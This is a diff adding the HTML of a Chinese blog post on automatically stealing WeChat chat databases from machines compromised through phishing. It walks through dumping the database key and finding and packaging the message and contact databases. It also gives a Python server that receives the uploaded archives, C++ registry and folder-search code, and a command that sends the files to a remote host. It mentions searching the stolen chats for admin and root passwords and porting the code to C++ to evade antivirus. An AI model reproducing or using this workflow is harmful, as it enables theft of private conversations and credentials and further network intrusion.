@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="微信聊天记录之自动化回传">
+<meta property="og:url" content="https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/index.html">
+<meta property="og:site_name" content="c1y2m3&#39;s blog">
+<meta property="og:description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285025071-6f462820-2c76-4568-aeac-5c3fc9dafb56.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285217728-dae87db3-aec1-4d7e-82c9-12e5fec7da03.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285667825-7dd2b04f-5eef-4aff-8fa3-d44368a07a2b.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/2.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/3.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/4.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/5.png">
+<meta property="article:published_time" content="2022-10-08T03:51:24.000Z">
+<meta property="article:modified_time" content="2023-09-25T11:37:39.023Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285025071-6f462820-2c76-4568-aeac-5c3fc9dafb56.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>微信聊天记录之自动化回传</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/19/%E5%85%B3%E4%BA%8E%E9%92%93%E9%B1%BC%E4%B8%8A%E7%BA%BF%E5%90%8E%E5%BE%AE%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&text=微信聊天记录之自动化回传"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&is_video=false&description=微信聊天记录之自动化回传"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=微信聊天记录之自动化回传&body=Check out this article: https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&name=微信聊天记录之自动化回传&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&t=微信聊天记录之自动化回传"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%BA%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">1.场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">2.手动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">3.自动化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E6%94%B6%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">服务端接收文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C"><span class="toc-number">4.</span> <span class="toc-text">最终效果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B"><span class="toc-number"></span> <span class="toc-text">改进</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        微信聊天记录之自动化回传
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-08T03:51:24.000Z" itemprop="datePublished">2022-10-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h3><p> 钓鱼攻击(通过钓鱼&#x2F;微信控到的机器通常都是登录状态)<br>渗透到运维机器(有些运维机器会日常登录自己的微信)<br>实战中钓鱼时常在微信聊天记录中找到目标内网系统账号、机器账号密码，尽可能的不触发大量扫描告警下在内网中精准打到跳板机,文章仅供学习使用。</p>
+<h3 id="2-手动"><a href="#2-手动" class="headerlink" title="2.手动"></a>2.手动</h3><p><a target="_blank" rel="noopener" href="https://github.com/Ormicron/Sharp-dumpkey">https://github.com/Ormicron/Sharp-dumpkey</a><br>1、获取微信数据库密钥，回传DBpass.bin<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285025071-6f462820-2c76-4568-aeac-5c3fc9dafb56.png" alt="1.png"><br>2、下载目标聊天数据库文件<br>默认保存目录在 c:\User\xxxx\Documents\Wechat Files\ wxid_xxxxx\Msg\Multi<br>超出240MB会自动生成MSG1.db，以此类推。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG0.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG1.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG2.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\MicroMsg.db &gt; Contact字段 &gt; 好友列表</span><br></pre></td></tr></table></figure>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285217728-dae87db3-aec1-4d7e-82c9-12e5fec7da03.png" alt="2.png"><br>3.将上面三个文件回传到同目录，配合ChatViewToo（<a target="_blank" rel="noopener" href="https://github.com/Ormicron/chatViewTool">https://github.com/Ormicron/chatViewTool</a>）打开解密即可查看，在搜索处”administrator”&#x2F; ‘“root” “密码” “ip等”<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1664285667825-7dd2b04f-5eef-4aff-8fa3-d44368a07a2b.png" alt="3.png"></p>
+<h3 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h3><p>看网上用的是根据注册表获取微信默认位置，其中需要微信id，通过基址和偏移可以得到，如果上线权限较低无法操作注册表或杀软hook就很尴尬了<br>2.这里用FindFirstFile遍历全盘指定文件后缀，如MSG0.db，MicroMsg.db文件压缩打包并通过curl后台运行上传到服务器。(curl.exe win10默认自带，可以上传一个或者引用C++第三方库）<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/c1y2m3/FileSearch">https://github.com/c1y2m3/FileSearch</a></p>
+<h4 id="服务端接收文件"><a href="#服务端接收文件" class="headerlink" title="服务端接收文件"></a>服务端接收文件</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html">https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html</a><br>使用<code>curl</code>将打包压缩的文件上传Put到文件服务器<br>example:python http_server.py 8 &#x2F;opt&#x2F;rh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;Extend Python&#x27;s built in HTTP server to save files</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import os</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    import http.server as server</span><br><span class="line">except ImportError:</span><br><span class="line">    # Handle Python 2.x</span><br><span class="line">    import SimpleHTTPServer as server</span><br><span class="line"></span><br><span class="line">log_path = &#x27;run_server_logs.log&#x27;</span><br><span class="line">logging.basicConfig(level=logging.INFO,format=&#x27;%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s&#x27;,datefmt=&#x27;%a, %d %b %Y %H:%M:%S&#x27;,filename=log_path)</span><br><span class="line">class HTTPRequestHandler(server.SimpleHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        self.send_response(404)</span><br><span class="line">        self.wfile.write(&quot;404 Not Found&quot;)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;Extend SimpleHTTPRequestHandler to handle PUT requests&quot;&quot;&quot;</span><br><span class="line">    def do_PUT(self):</span><br><span class="line">        &quot;&quot;&quot;Save a file following a HTTP PUT request&quot;&quot;&quot;</span><br><span class="line">        filename = os.path.basename(self.path)</span><br><span class="line"></span><br><span class="line">        # Don&#x27;t overwrite files</span><br><span class="line">        if os.path.exists(filename):</span><br><span class="line">            self.send_response(409, &#x27;Conflict&#x27;)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            reply_body = &#x27;&quot;%s&quot; already exists\n&#x27; % filename</span><br><span class="line">            self.wfile.write(reply_body.encode(&#x27;utf-8&#x27;))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        file_length = int(self.headers[&#x27;Content-Length&#x27;])</span><br><span class="line">        output_file = &#x27;tmp.txt&#x27;</span><br><span class="line">        with open(filename, &#x27;wb&#x27;) as output_file:</span><br><span class="line">            output_file.write(self.rfile.read(file_length))</span><br><span class="line">        self.send_response(201, &#x27;Created&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        reply_body = &#x27;Saved &quot;%s&quot;\n&#x27; % filename</span><br><span class="line">        logging.info(self.headers)</span><br><span class="line">        self.wfile.write(reply_body.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if sys.argv[2:]:</span><br><span class="line">        os.chdir(sys.argv[2])</span><br><span class="line">    server.test(HandlerClass=HTTPRequestHandler)</span><br></pre></td></tr></table></figure>
+<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>FileSearchPlus.exe default xxx.xxx.xxx.xxx<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1.png" alt="微信截图_20220930000738.png"></p>
+<h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/2.png"></p>
+<p>实战中发现全盘查找微信db在c2中非常拉跨，查找等待时间较长，且盘符越多越慢<br>1、直接读取注册表的键值，wxid关键字匹配拼接路径(碰到用户自设的路径，需要加个指定路径去)</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/3.png" alt="微信截图_20221014133740.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void getPath(char *dbpath)</span><br><span class="line">&#123;</span><br><span class="line">	char cmd_command[256] = &#123; 0 &#125;;</span><br><span class="line">	char regname[] = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	DWORD dwType = REG_BINARY;</span><br><span class="line">	REGSAM mode = KEY_READ;</span><br><span class="line">	DWORD length = 256;</span><br><span class="line">	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &amp;hKey);</span><br><span class="line"></span><br><span class="line">	ret = RegQueryValueEx(hKey, &quot;Personal&quot;, 0, &amp;dwType, (LPBYTE)dbpath, &amp;length);</span><br><span class="line">	strcat(dbpath, &quot;\\WeChat Files&quot;);</span><br><span class="line">	//cout &lt;&lt; dbpath &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	if (ret == 0) &#123;</span><br><span class="line">		RegCloseKey(hKey);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		printf(&quot;failed to open regedit.%d\n&quot;, ret);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void getFileNames(string path, vector&lt;string&gt;&amp; files)</span><br><span class="line">&#123;</span><br><span class="line">	intptr_t hFile = 0;</span><br><span class="line">	//文件信息</span><br><span class="line">	struct _finddata_t fileinfo;</span><br><span class="line">	string p;</span><br><span class="line">	string::size_type idx;</span><br><span class="line"></span><br><span class="line">	if ((hFile = _findfirst(p.assign(path).append(&quot;\\*&quot;).c_str(), &amp;fileinfo)) != -1)</span><br><span class="line">	&#123;</span><br><span class="line">		do</span><br><span class="line">		&#123;</span><br><span class="line">			//如果是目录,匹配文件夹</span><br><span class="line">			if ((fileinfo.attrib &amp; _A_SUBDIR))</span><br><span class="line">			&#123;</span><br><span class="line">				if (strstr(fileinfo.name, &quot;wxid&quot;) != NULL)</span><br><span class="line">					files.push_back(p.assign(path).append(&quot;\\&quot;).append(fileinfo.name));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; while (_findnext(hFile, &amp;fileinfo) == 0);</span><br><span class="line">		_findclose(hFile);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、传输改成socket协议，支持大文件上传，效率很快，需要启动个Server socket<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/4.png"></p>
+<p>3、参考<a target="_blank" rel="noopener" href="https://github.com/Ormicron/Sharp-dumpkey">https://github.com/Ormicron/Sharp-dumpkey</a><br>远程拉取基址，考虑到免杀性改成了C++代码，<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/5.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/life/">漂泊</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%BA%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">1.场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">2.手动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">3.自动化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E6%94%B6%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">服务端接收文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C"><span class="toc-number">4.</span> <span class="toc-text">最终效果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B"><span class="toc-number"></span> <span class="toc-text">改进</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&text=微信聊天记录之自动化回传"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&is_video=false&description=微信聊天记录之自动化回传"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=微信聊天记录之自动化回传&body=Check out this article: https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&title=微信聊天记录之自动化回传"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&name=微信聊天记录之自动化回传&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2022/10/08/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9B%9E%E4%BC%A0/&t=微信聊天记录之自动化回传"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
